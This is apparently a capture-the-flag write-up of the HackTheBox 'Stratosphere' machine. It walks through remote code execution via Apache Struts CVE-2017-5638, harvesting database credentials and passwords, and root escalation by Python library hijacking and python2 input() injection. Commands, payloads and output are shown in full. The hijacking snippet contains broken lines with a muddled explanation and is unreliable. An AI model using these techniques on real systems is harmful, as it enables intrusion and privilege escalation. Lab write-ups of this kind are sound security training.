I"Ââ<p><strong>Stratosphere</strong> is a pretty cool box with an <strong>Apache Struts vulnerability</strong> in which endpoints ending with .action, .go, .do can be injected with a specially crafted Content-Header leading to Remote code execution. The exploit doesn‚Äôt give us a shell, So I went on with <strong>Dumping MySQL database without an interactive shell</strong> which gives me user‚Äôs password. For root, We have to exploit a python script which I did in two ways: <strong>Python library hijacking</strong> and exploiting <strong>vulnerable python2 input()</strong> function.</p>

<h2 id="masscan--nmap">Masscan + Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Discovered open port 8080/tcp on 10.10.10.64                                   
Discovered open port 80/tcp on 10.10.10.64                                     
Discovered open port 22/tcp on 10.10.10.64                                     
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
<span class="c"># Nmap 7.91 scan initiated Tue Aug  3 02:37:52 2021 as: nmap -v -sVC --min-rate 1000 -p 8080,80,22 -oN nmap-fullscan.out 10.10.10.64</span>
Nmap scan report <span class="k">for </span>10.10.10.64
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d <span class="o">(</span>RSA<span class="o">)</span>
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http
| fingerprint-strings:ff
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Mon, 02 Aug 2021 21:12:32 GMT
|     Connection: close
|     &lt;<span class="o">!</span>doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP Status 404 
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Mon, 02 Aug 2021 21:12:31 GMT
|     Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Mon, 02 Aug 2021 21:12:32 GMT
|     Connection: close
|     &lt;<span class="o">!</span>doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP Status 404 
| http-methods: 
|   Supported Methods: GET HEAD 	POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service 
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Aug  3 02:38:25 2021 -- 1 IP address (1 host up) scanned in 32.83 seconds</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="http">HTTP</h1>
<p>I tried fuzzing with <code class="language-plaintext highlighter-rouge">raft-medium</code> and <code class="language-plaintext highlighter-rouge">dirbuster-medium</code> wordlist. Dirbuster list gave me an endpoint which wasn‚Äôt in raft-medium (Dirbuster list has <code class="language-plaintext highlighter-rouge">Monitoring</code>, seclists has it as <code class="language-plaintext highlighter-rouge">monitoring</code>.).</p>

<p>I ended up making a new wordlist having raft-medium at the top and appending the words not in it from  <code class="language-plaintext highlighter-rouge">dirbuster-medium</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">comm</span> <span class="nt">-23</span> sorted-directory-list-2.3-medium.txt sorted-raft-medium-words.txt  <span class="o">&gt;</span> words-not-in-raft-medium
<span class="nv">$ </span><span class="nb">cat</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt words-not-in-seclists-raft-medium <span class="o">&gt;</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Directory brute forcing:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.10.10.64/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.64/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
.                       [Status: 200, Size: 1708, Words: 297, Lines: 64]
                        [Status: 200, Size: 1708, Words: 297, Lines: 64]
Monitoring              [Status: 302, Size: 0, Words: 1, Lines: 1]
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Visiting any non-existing page gives a 404 and  <em>‚ÄúApache Tomcat/8.5.14 (Debian)‚Äù</em>. 
and it does have some exploits:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit Apache Tomcat 8.5.14
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                 |  Path
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Apache Tomcat &lt; 9.0.1 <span class="o">(</span>Beta<span class="o">)</span> / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypa | jsp/webapps/42966.py
Apache Tomcat &lt; 9.0.1 <span class="o">(</span>Beta<span class="o">)</span> / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypa | windows/webapps/42953.txt
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I tried working with both exploits, none of them worked.(tried that windows one, even if the box is linux one)</p>

<h1 id="apache-struts-cve-2017-5638">Apache Struts CVE-2017-5638</h1>
<p>That Monitoring endpoint also doesn‚Äôt do anything, login and register forms just say it‚Äôs in construction.
But thing to notice here is when you use Struts, the framework provides you with a controller servlet, ActionServlet.</p>

<p>Here‚Äôs my POST request for the login page:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>POST /Monitoring/example/Login.action HTTP/1.1
Host: 10.10.10.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://10.10.10.64
Connection: close
Referer: http://10.10.10.64/Monitoring/example/Login_input.action;jsessionid=90C11497ABE9AA524209F6B65F6EED93
Cookie: JSESSIONID=90C11497ABE9AA524209F6B65F6EED93
Upgrade-Insecure-Requests: 1

username=admin&amp;password=admin
</pre></td></tr></tbody></table></code></pre></div></div>

<blockquote>
  <p>And even if I google something like <em>‚ÄúApache .action endpoints‚Äù</em>, shows me <em>‚ÄúIf you find endpoints ending with .action, .do, .go that means that the website is running Struts2 and might be vulnerable. ‚Äú</em></p>

  <p><img src="/assets/img/Posts/Stratosphere/stratosphere-1.png" alt="stratosphere-1.png" /></p>
</blockquote>

<p><a href="https://medium.com/@abhishake21/rce-via-apache-struts2-still-out-there-b15ce205aa21">This</a> medium article mentions of an exploit via a specially crafted Content-Header. It also gives an auto-exploit script <a href="https://github.com/mazen160/struts-pwn">here</a> which mentions <strong>Apache Struts CVE-2017-5638</strong>. I can even use the exploit-db script <a href="https://www.exploit-db.com/exploits/41570">here</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action <span class="nb">id</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE: 2017-5638 - Apache Struts2 S2-045
<span class="o">[</span><span class="k">*</span><span class="o">]</span> cmd: <span class="nb">id

</span><span class="nv">uid</span><span class="o">=</span>115<span class="o">(</span>tomcat8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>119<span class="o">(</span>tomcat8<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>119<span class="o">(</span>tomcat8<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>But this one doesn‚Äôt let me have any shell.
I modified the script to give me a look of shell. This is the part that was modified.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="kn">import</span> <span class="nn">sys</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[*] struts2_S2-045.py &lt;url&gt;"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'[*] CVE: 2017-5638 - Apache Struts2 S2-045'</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
            <span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>You can use this command example for the original script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action <span class="s1">'ls -l'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I‚Äôll work with the modified script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>root@caretaker# python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE: 2017-5638 - Apache Struts2 S2-045
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>115<span class="o">(</span>tomcat8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>119<span class="o">(</span>tomcat8<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>119<span class="o">(</span>tomcat8<span class="o">)</span>

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 24
drwxr-xr-x  5 root    root    4096 Aug  4 05:36 <span class="nb">.</span>
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -&gt; /etc/tomcat8
<span class="nt">-rw-r--r--</span>  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -&gt; ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Aug  4 05:36 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -&gt; ../../cache/tomcat8
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This <a href="https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html#building-a-shell">script</a> by Ippsec and 0xdf makes a legit stabilized shell.</p>

<h1 id="mysql-database-dump">MySQL Database dump</h1>

<p>I saw that <code class="language-plaintext highlighter-rouge">db_connect</code> above, listing the contents:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>db_connect
<span class="o">[</span>ssn]
<span class="nv">user</span><span class="o">=</span>ssn_admin
<span class="nv">pass</span><span class="o">=</span>AWs64@on<span class="k">*</span>&amp;

<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
<span class="nv">user</span><span class="o">=</span>admin
<span class="nv">pass</span><span class="o">=</span>admin
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I tried this password with username <code class="language-plaintext highlighter-rouge">richard</code> on SSH, I got from passwd file, didn‚Äôt work.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mysql <span class="nt">-ussn_admin</span> <span class="nt">-p</span><span class="s2">"AWs64@on*&amp;"</span> <span class="nt">-e</span> <span class="s2">"show privileges;"</span>
Database
information_schema
ssn
<span class="nv">$ </span>mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"show databases;"</span>
Database
information_schema
<span class="nb">users</span>
<span class="nv">$ </span>mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"use users;show tables;"</span>
Tables_in_users
accounts
<span class="nv">$ </span>mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"use users;select * from accounts;"</span>
fullName        password        username
Richard F. Smith        9tc<span class="k">*</span>rhKuG5TyXvUJOrE^5CK7k       richard
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I can get SSH shell with user <code class="language-plaintext highlighter-rouge">richard</code>.</p>

<h1 id="privesc-with-python2">Privesc with python2</h1>
<p>If I list sudo permissions on this user:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>richard on stratosphere:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User richard may run the following commands on stratosphere:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python<span class="k">*</span> /home/richard/test.py
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is the content of test.py</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">hashlib</span>


<span class="k">def</span> <span class="nf">question</span><span class="p">():</span>
    <span class="n">q1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Solve: 5af003e100c80923ec04d65933d382cb</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
    <span class="n">md5</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">q1</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">md5</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">"5af003e100c80923ec04d65933d382cb"</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Sorry, that's not right"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"You got it!"</span><span class="p">)</span>
    <span class="n">q2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sha1</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">()</span>
    <span class="n">sha1</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">q2</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">sha1</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'d24f6fb449855ff42344feff18ee2819033529ff'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Nope, that one didn't work..."</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"WOW, you're really good at this!"</span><span class="p">)</span>
    <span class="n">q3</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"How about this? 91ae5fc9ecbca9d346225063f23d2bd9</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">md4</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md4'</span><span class="p">)</span>
    <span class="n">md4</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">q3</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">md4</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'91ae5fc9ecbca9d346225063f23d2bd9'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Yeah, I don't think that's right."</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"OK, OK! I get it. You know how to crack hashes..."</span><span class="p">)</span>
    <span class="n">q4</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">blake</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'BLAKE2b512'</span><span class="p">)</span>
    <span class="n">blake</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">q4</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">blake</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"You were so close! urg... sorry rules are rules."</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="kn">import</span> <span class="nn">os</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/root/success.py'</span><span class="p">)</span>
    <span class="k">return</span>

<span class="n">question</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="method-1-library-hijacking">Method-1 Library Hijacking</h2>
<p>Since we‚Äôve write access to the directory where the script is running, I can Hijack the two libraries running on it. Namely: <code class="language-plaintext highlighter-rouge">os</code> and <code class="language-plaintext highlighter-rouge">hashlib</code>.</p>

<p>For execution of <code class="language-plaintext highlighter-rouge">os</code>,  I need to pass that whole md5 comparisons, for something easy I can hijack <code class="language-plaintext highlighter-rouge">hashlib</code> by making hashlib.py at the same directory as test.py with the contents:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This script just imports OS, runs <code class="language-plaintext highlighter-rouge">/bin/sh</code> with the 3 file-descriptors. Also the file-descriptors are defined in function <code class="language-plaintext highlighter-rouge">md5</code> as it‚Äôs being used by test.py as <code class="language-plaintext highlighter-rouge">hashlib.md5()</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/richard/test.py
<span class="c"># whoami</span>
root
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="method-2-vulnerable-input-in-python2">Method-2 Vulnerable input() in python2</h2>
<p>If I look closely on the sudo permissions, there‚Äôs a wildcard for the python version I can use.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python<span class="k">*</span> /home/richard/test.py
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Script intends to be called with python3, both in the shebang line and in the default mapping:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>and</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>richard@stratosphere:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/python
lrwxrwxrwx 1 root root      16 Feb 11 19:46 /usr/bin/python -&gt; /usr/bin/python3
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let‚Äôs see what‚Äôs different and vulnerable in python2 and not in python3.
In python2, input is equivalent to <code class="language-plaintext highlighter-rouge">eval(raw_input())</code>, so whatever a user passes is evaluated first.</p>

<p>Here‚Äôs a quick example:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">a</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s">"Evaluate: "</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running with both python2 and python3:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 abc.py
Evaluate: 1+1
2

<span class="nv">$ </span>python3 abc.py
Evaluate: 1+1
1+1
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Since, the code doesn‚Äôt import OS, Subprocess or any other library (just hashlib) before inputs are being called. So without importing the OS module. It will give a NameError saying that name ‚Äòos‚Äô is not defined.
Well, there is a way around this‚Ä¶
There‚Äôs a global <code class="language-plaintext highlighter-rouge">__import__()</code> function in python. It accepts a module name and imports it.</p>

<p>Where earlier only passing <code class="language-plaintext highlighter-rouge">os.system("whoami")</code>  would‚Äôve worked, it changes to: 
<code class="language-plaintext highlighter-rouge">__import__("os").system("whoami")</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span>  /usr/bin/python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__<span class="o">(</span><span class="s2">"os"</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">"whoami"</span><span class="o">)</span>
root
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/home/richard/test.py"</span>, line 38, <span class="k">in</span> &lt;module&gt;
    question<span class="o">()</span>
  File <span class="s2">"/home/richard/test.py"</span>, line 8, <span class="k">in </span>question
    md5.update<span class="o">(</span>q1.encode<span class="o">())</span>
AttributeError: <span class="s1">'int'</span> object has no attribute <span class="s1">'encode'</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So, even though I see a lot of errors, I don‚Äôt miss that <code class="language-plaintext highlighter-rouge">root</code> just after I passed the input.</p>

